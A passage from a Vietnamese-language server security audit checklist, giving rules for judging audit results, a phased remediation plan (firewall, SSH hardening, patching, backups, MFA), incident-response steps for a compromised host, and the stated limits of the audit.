| T5 | Leo thang đặc quyền / container | ×2 | |
| T7 | CVE và tấn công nâng cao | ×2 | |
| T6 | Supply chain / CI-CD | ×1 | |
| T9 | Giám sát và phục hồi | ×2 | |

**Quy tắc kết luận:**
- Bất kỳ **FAIL** nào ở T8 → xử lý sự cố, dừng audit, chuyển sang quy trình ứng phó
- Bất kỳ **FAIL** nào ở T1/T2/T4 → rủi ro CRITICAL, xử lý trong 24h
- ≥ 3 **WARN** ở cùng một tier → coi như FAIL của tier đó

---

## 11. THỨ TỰ XỬ LÝ SAU KHI CÓ KẾT QUẢ

**Không triển khai bất kỳ thay đổi nào ở mục này khi chưa có phê duyệt.**

**Giai đoạn 1 — trong 24 giờ (nếu phát hiện):**
1. Đóng mọi datastore đang phơi ra internet (Redis, MySQL, Mongo, Elastic)
2. Tắt `PasswordAuthentication`, tắt `PermitRootLogin`
3. Bật firewall với default policy DROP, **bao gồm cả IPv6**
4. Xoá file nhạy cảm khỏi webroot (`.env`, `.git`, `*.sql`, backup)
5. Vá CVE mức CRITICAL có exploit công khai

**Giai đoạn 2 — trong 7 ngày:**
6. Cài fail2ban / CrowdSec
7. Bật `unattended-upgrades` cho security repo
8. Siết quyền file: `.env` 600, private key 600, wp-config 640
9. Bổ sung security headers, siết cấu hình TLS
10. Rà soát và thu hẹp quyền sudo

**Giai đoạn 3 — trong 30 ngày:**
11. Thiết lập log tập trung off-site
12. Cài FIM (AIDE hoặc Wazuh)
13. Thiết lập backup 3-2-1 có bản immutable, **test restore thật**
14. Cứng hoá systemd unit, bật AppArmor/SELinux
15. Bật MFA cho SSH
16. Rà supply chain dependency, pin version

**Giai đoạn 4 — định kỳ:**
- Hàng tuần: rà log đăng nhập thành công, kiểm tra bản vá chờ
- Hàng tháng: chạy lại toàn bộ checklist này
- Hàng quý: test restore backup, diễn tập ứng phó sự cố
- Hàng năm: pentest bên ngoài

---

## 12. KHI XÁC ĐỊNH ĐÃ BỊ XÂM NHẬP

Thứ tự bắt buộc — làm sai thứ tự sẽ mất bằng chứng:

1. **KHÔNG reboot, KHÔNG tắt máy** — mất toàn bộ dữ liệu trong RAM và tiến trình đang chạy
2. **Snapshot toàn bộ disk** qua panel nhà cung cấp — làm trước mọi thao tác khác
3. **Cô lập mạng** — firewall rule chỉ cho phép IP của mày, hoặc dùng tính năng isolate của provider
4. **Thu thập forensic khi máy còn sống:** `ps auxwf`, `ss -tunp`, `lsof -n`, `/proc/*/exe`, `last`, log — lưu ra ngoài máy
5. **Xác định entry point** — nếu không tìm ra thì dựng lại cũng sẽ bị lại
6. **Xoay toàn bộ credential:** password DB, API key, SSH key, token CI/CD, session secret, key thanh toán. Giả định mọi thứ trên máy đã lộ.
7. **Rebuild từ image sạch** — không "dọn dẹp". Restore data sau khi đã scan
8. **Nghĩa vụ thông báo:** nếu có dữ liệu cá nhân của client (ngân hàng, y tế), kiểm tra nghĩa vụ thông báo theo Nghị định 13/2023/NĐ-CP về bảo vệ dữ liệu cá nhân, và GDPR nếu có người dùng EU (72 giờ)

---

## 13. GIỚI HẠN CỦA TÀI LIỆU NÀY

Nói thẳng để không ai hiểu nhầm phạm vi:

- Checklist này **không thay thế pentest**. Nó phát hiện lỗi cấu hình và lỗ hổng đã biết, không phát hiện lỗi logic nghiệp vụ trong ứng dụng.
- Toàn bộ lệnh chạy **từ trong máy**. Nếu máy đã bị rootkit, output có thể bị làm giả. Đó là lý do T8 đứng đầu và tại sao các mục quan trọng cần xác minh L3 từ ngoài.
- Bảng CVE là **ảnh chụp tĩnh** và sẽ lỗi thời. Nguồn đáng tin duy nhất là security tracker của distro + CISA KEV.
- Audit không kiểm tra được **bảo mật tầng nhà cung cấp**: panel VPS có 2FA không, ai truy cập được console, snapshot lưu ở đâu. Đây thường là mắt xích yếu nhất và nằm ngoài tầm với của lệnh trên máy.
- Không kiểm tra **yếu tố con người**: ai còn giữ credential sau khi nghỉ việc, quy trình cấp quyền, social engineering.
